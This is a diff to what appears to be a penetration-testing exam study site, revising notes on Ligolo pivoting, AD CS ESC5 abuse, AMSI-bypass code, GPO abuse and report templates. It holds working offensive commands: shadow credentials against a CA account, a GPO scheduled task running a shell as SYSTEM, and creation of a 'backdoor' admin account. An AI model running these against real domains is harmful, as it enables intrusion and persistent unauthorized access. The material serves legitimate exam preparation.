@@ -191,18 +191,25 @@ sudo ip route add 192.168.100.0/24 dev ligolo2
 </div>
 
 <h2 id="socks5">SOCKS5 + Proxychains (Alternative)</h2>
-<p>When you need UDP or non-TCP protocols that TUN routing doesn't cover:</p>
-<pre><code># In proxy console (session selected):
-listener_add --addr 0.0.0.0:1080 --to 127.0.0.1:1080 --tcp
+<p>The TUN interface handles most protocols natively. Use SOCKS5 only when a specific tool requires it (e.g., some Python scripts). Note: <code>listener_add</code> creates TCP port forwarders (agent-side binding → Kali target) — it is <strong>not</strong> a SOCKS5 proxy.</p>
+<pre><code># SOCKS5 proxy — run in proxy console with a session active:
+socks5 start --addr 127.0.0.1 --port 1080
+# This creates a SOCKS5 proxy on Kali that routes through the selected agent tunnel
 
-# Start SOCKS5 listener directly in Ligolo proxy (no session needed):
-socks5 start --port 1080
+# Stop it:
+socks5 stop
 
+# Configure proxychains to use it:
 # /etc/proxychains4.conf:
 socks5 127.0.0.1 1080
 
 # Use with tools that need proxychains:
-proxychains nmap -sT -Pn 192.168.100.5 -p 445</code></pre>
+proxychains nmap -sT -Pn 192.168.100.5 -p 445
+
+# listener_add — separate feature (TCP port forwarder on the agent side):
+# listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80
+# → Opens port 8080 on the agent host, forwards to Kali:80
+# Useful for: making your Kali web server reachable from the internal network</code></pre>
 
 <h2 id="tips">Exam Tips</h2>
 <ul>
@@ -293,9 +300,40 @@ certipy template -u 'jdoe@corp.local' -p 'Password1!' \
   -template 'TargetTemplate' -configuration TargetTemplate.json -dc-ip 10.10.10.5</code></pre>
 
 <h2 id="esc5">ESC5 — PKI Object Access Control</h2>
-<p><strong>Condition:</strong> Compromise of an object that has extensive rights (e.g., Full Control) over the CA server's AD object or PKI related groups.</p>
-<pre><code># Attack path heavily relies on standard AD ACL abuse (e.g., adding user to Cert Publishers group).
-# Once the group/AD object is controlled, it enables other ESC paths like ESC4 or ESC7.</code></pre>
+<p><strong>Condition:</strong> A principal has dangerous rights (GenericAll, GenericWrite, WriteDacl, WriteOwner) over PKI-related objects: the CA server computer object, the <code>NTAuthCertificates</code> container, or the <code>Cert Publishers</code> group. Compromising these objects enables escalation to full CA control.</p>
+<p>ESC5 is not a standalone attack — it is a path to gaining ManageCA or ManageCertificates rights, which then enables ESC7.</p>
+
+<h3>Scenario: GenericWrite on CA Computer Object</h3>
+<pre><code># Identify: BloodHound → find GenericWrite/GenericAll edges to the CA computer object
+# Example: your user has GenericWrite on the CA server computer object "CERTSRV$"
+
+# Step 1: Configure shadow credentials on the CA computer object
+certipy shadow auto -u 'jdoe@corp.local' -p 'Password1!' \\
+  -account 'CERTSRV$' -dc-ip 10.10.10.5
+# → NT hash of CERTSRV$ machine account
+
+# Step 2: Authenticate as the CA machine account
+export KRB5CCNAME='CERTSRV$.ccache'
+
+# Step 3: With the CA machine account, you have ManageCA rights on the CA itself
+# Now proceed with ESC7 — add officer, enable SubCA template, request + issue cert
+certipy ca -u 'CERTSRV$@corp.local' -hashes :<NT_HASH> -ca 'CORP-CA' \\
+  -add-officer 'CERTSRV$' -dc-ip 10.10.10.5</code></pre>
+
+<h3>Scenario: GenericWrite on Cert Publishers Group</h3>
+<pre><code># Cert Publishers group members can publish certificates to AD
+# Adding yourself enables publishing of custom certs (enables manual PKINIT paths)
+
+# PowerView — add your user to Cert Publishers
+Add-DomainGroupMember -Identity 'Cert Publishers' -Members 'jdoe' -Credential $cred
+
+# Or via net rpc:
+net rpc group addmem "Cert Publishers" "jdoe" \\
+  -U corp.local/jdoe%'Password1!' -S 10.10.10.5</code></pre>
+
+<div class="tip-box">
+<strong>Key Point:</strong> ESC5 is often discovered through BloodHound by searching for principals with write access to the CA computer object (<code>certsrv</code> or similar). The resulting access typically leads to ESC7 exploitation — treat ESC5 as "path to ESC7."
+</div>
 
 <h2 id="esc6">ESC6 — CA EDITF_ATTRIBUTESUBJECTALTNAME2</h2>
 <p><strong>Condition:</strong> CA has the <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> flag set — any template allowing enrollment can include arbitrary SAN.</p>
@@ -623,10 +661,6 @@ impacket-ntlmrelayx -t http://CA_IP/certsrv/certfnsh.asp -smb2support --adcs --t
 $a = 'Ams'; $b = 'iSca'; $c = 'nBuf'; $d = 'fer'
 $AmsiFunc = $a + $b + $c + $d
 
-$lib = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
-$field = $lib.GetField('amsiContext','NonPublic,Static')
-$ctx = $field.GetValue($null)
-
 Add-Type -MemberDefinition @"
   [DllImport("kernel32")]
   public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
@@ -705,16 +739,25 @@ $asm = [System.Reflection.Assembly]::Load($bytes)
     content: `
 <h2 id="discovery">GPO Discovery</h2>
 <pre><code># Find GPOs where your user/group has write rights
-# BloodHound: look for GenericWrite, WriteDACL edges to GPO nodes
+# Primary method: BloodHound — look for GenericWrite, WriteDACL edges to GPO nodes
+# Right-click any GPO node → "Shortest Paths to Here from Owned"
 
-# PowerView
-Get-GPO -All | Get-GPOReport -ReportType Xml | Select-String "WriteProperty"
+# PowerView (modern syntax — use Get-DomainGPO not Get-NetGPO)
+Get-DomainGPO -Properties DisplayName,Name | ForEach-Object {
+  $gpo = $_
+  Get-DomainObjectAcl -Identity $gpo.Name -ResolveGUIDs | Where-Object {
+    $_.ActiveDirectoryRights -match 'GenericWrite|WriteDacl|WriteProperty' -and
+    $_.SecurityIdentifier -ne 'S-1-5-18'
+  } | Select-Object @{N='GPO';E={$gpo.DisplayName}}, SecurityIdentifier, ActiveDirectoryRights
+}
 
-# Find GPOs linked to OU containing target computers
-Get-NetOU -GUID | %{ Get-NetGPO -GPOName (Get-NetOU $_).gplink }
+# Quick check on a specific GPO GUID
+Get-DomainObjectAcl -Identity "GPO-GUID" -ResolveGUIDs | Where-Object {
+  $_.ActiveDirectoryRights -match 'Write'
+}
 
-# Check who can modify specific GPO
-Get-GPPermission -Guid "GPO-GUID" -All</code></pre>
+# Check which OUs (and machines) a GPO applies to
+Get-DomainOU -GPLink "GPO-GUID" | Select-Object distinguishedname</code></pre>
 
 <h2 id="abusing-write">Abusing GPO Write Rights</h2>
 <p>If BloodHound shows <code>GenericWrite</code> on a GPO that applies to machines you want to compromise, you can modify the GPO to run arbitrary code as SYSTEM on those machines.</p>
@@ -725,8 +768,8 @@ SharpGPOAbuse.exe --AddLocalAdmin --UserAccount hacker --GPOName "Vulnerable GPO
 SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author "NT AUTHORITY\SYSTEM" \
   --Command "cmd.exe" --Arguments "/c C:\Windows\Temp\shell.exe" --GPOName "Vulnerable GPO"
 
-# PyGPOAbuse (from Kali Linux)
-pygpoabuse.py CORP.LOCAL/hacker:'Pass123!' -gpo-id "<GPO_GUID>" \
+# pygpoabuse (from Kali Linux — https://github.com/Hackndo/pyGPOAbuse)
+pygpoabuse CORP.LOCAL/hacker:'Pass123!' -gpo-id "<GPO_GUID>" \
   -command "net user backdoor Pass123! /add && net localgroup administrators backdoor /add"</code></pre>
 
 <h2 id="scheduled-task">Scheduled Task via GPO (Manual)</h2>
@@ -789,8 +832,8 @@ git clone https://github.com/Syslifters/sysreptor.git
 cd sysreptor/deploy
 
 # Configure
-cp .env.example .env
-nano .env  # Set DJANGO_SECRET_KEY to random 64-char string
+cp app.env.example app.env
+nano app.env  # Set DJANGO_SECRET_KEY to random 64-char string
 
 # Start
 docker compose up -d
@@ -802,16 +845,20 @@ docker compose up -d
 docker compose exec app python manage.py createsuperuser</code></pre>
 
 <h2 id="templates">CPTS Finding Templates</h2>
-<p>Import the community CPTS template pack for pre-built finding types aligned to CPTS exam objectives:</p>
-<pre><code># Download CPTS community templates
-curl -O https://github.com/Syslifters/reptor/raw/main/templates/cpts-bundle.tar.gz
-
-# Import via CLI (reptor)
+<p>SysReptor ships with built-in templates. You can also create and import custom finding templates via the GUI or the <code>reptor</code> CLI tool:</p>
+<pre><code># Install the reptor CLI companion
 pip install reptor
-reptor --server http://localhost:8000 --token YOUR_API_TOKEN \\
-  importfindings cpts-bundle.tar.gz
 
-# Or import via GUI: Admin → Templates → Import</code></pre>
+# Push a finding note from the CLI (reptor note subcommand)
+reptor --server http://localhost:8000 --token YOUR_API_TOKEN note
+
+# Upload files (evidence, screenshots) from command line
+reptor --server http://localhost:8000 --token YOUR_API_TOKEN upload file.png
+
+# Import custom templates via GUI:
+# Admin → Design → Templates → Import (upload a .tar.gz template pack)
+
+# To create a template: Admin → Design → Templates → New Template</code></pre>
 <p>Key finding templates to have ready:</p>
 <ul>
 <li>SQL Injection (CVSS 9.8 pre-filled)</li>
@@ -905,7 +952,7 @@ reptor --server http://localhost:8000 --token TOKEN \\
 <tr><th>Machine</th><th>OS</th><th>CPTS Modules</th><th>Key Concepts</th></tr>
 <tr><td>Poison</td><td>Linux</td><td>File Inclusion, Shells</td><td>LFI → RCE, log poisoning</td></tr>
 <tr><td>Magic</td><td>Linux</td><td>File Upload</td><td>MIME bypass, PHP webshell upload</td></tr>
-<tr><td>Nightmare</td><td>Linux</td><td>SQLi, SQLMap</td><td>Blind SQLi, file read</td></tr>
+<tr><td>Bolt</td><td>Linux</td><td>SQLi, SQLMap</td><td>Server-side template injection, credential reuse</td></tr>
 <tr><td>Horizontall</td><td>Linux</td><td>Ffuf, Web Attacks</td><td>API subdomain, Strapi RCE</td></tr>
 <tr><td>Bashed</td><td>Linux</td><td>Footprinting, PrivEsc</td><td>Web discovery, sudo privesc</td></tr>
 <tr><td>Optimum</td><td>Windows</td><td>Common Apps</td><td>HFS RCE, Windows privesc</td></tr>
@@ -930,8 +977,8 @@ reptor --server http://localhost:8000 --token TOKEN \\
 <h2 id="privesc">Privilege Escalation</h2>
 <table class="data-table">
 <tr><th>Machine</th><th>OS</th><th>CPTS Modules</th><th>Key Concepts</th></tr>
-<tr><td>Beep</td><td>Linux</td><td>Linux PrivEsc</td><td>Shellshock, sudo -l, file permissions</td></tr>
-<tr><td>Sunday</td><td>Linux</td><td>Linux PrivEsc, Password Attacks</td><td>Finger enumeration, sudo wget</td></tr>
+<tr><td>Beep</td><td>Linux</td><td>Linux PrivEsc, Common Services</td><td>FreePBX/Elastix LFI → RCE, Webmin exploit, multiple privesc paths (sudo nmap, sudo -l)</td></tr>
+<tr><td>Sunday</td><td>Solaris</td><td>Linux PrivEsc, Password Attacks</td><td>Finger enumeration, shadow hash cracking, sudo wget</td></tr>
 <tr><td>Valentine</td><td>Linux</td><td>Linux PrivEsc</td><td>Heartbleed, tmux session hijack</td></tr>
 <tr><td>Shocker</td><td>Linux</td><td>Linux PrivEsc</td><td>Shellshock, sudo perl</td></tr>
 <tr><td>Arctic</td><td>Windows</td><td>Windows PrivEsc</td><td>ColdFusion exploit, JuicyPotato</td></tr>
@@ -981,8 +1028,9 @@ certipy find -u 'jdoe@corp.local' -p 'Password1!' -dc-ip 10.10.10.5
 # Show only vulnerable findings (cleaner output)
 certipy find -u 'jdoe@corp.local' -p 'Password1!' -dc-ip 10.10.10.5 -vulnerable -stdout
 
-# Save to JSON for BloodHound import
-certipy find -u 'jdoe@corp.local' -p 'Password1!' -dc-ip 10.10.10.5 -json
+# Save output to files (default: saves .json + .txt in current directory)
+certipy find -u 'jdoe@corp.local' -p 'Password1!' -dc-ip 10.10.10.5
+# → creates corp.local_Certipy.json and corp.local_Certipy.txt
 
 # Key output fields to look for:
 # - "Enabled": true (template must be enabled)
@@ -1137,7 +1185,7 @@ certipy shadow remove -u 'jdoe@corp.local' -p 'Password1!' \\
 <li>BloodHound edges: <code>GenericWrite</code> on any user/computer → Shadow Credentials attack is viable</li>
 <li>Verify the domain supports PKINIT before attempting: <code>certipy find</code> output shows DC cert capabilities</li>
 <li>The <code>-account</code> flag accepts the sAMAccountName (e.g., <code>jdoe</code> not <code>jdoe@corp.local</code>)</li>
-<li>If certipy auth fails with certificate error, try adding <code>-ldap-shell</code> flag for an LDAP shell instead</li>
+<li>If PKINIT-based auth fails (DC lacks a KDC certificate), use the auto mode with LDAP shell fallback: <code>certipy shadow auto -ldap-shell -u jdoe@corp.local -p 'Pass' -account targetuser -dc-ip DC_IP</code> — the <code>-ldap-shell</code> flag belongs on <code>shadow auto</code>, not on <code>certipy auth</code></li>
 </ul>`,
   },
   {
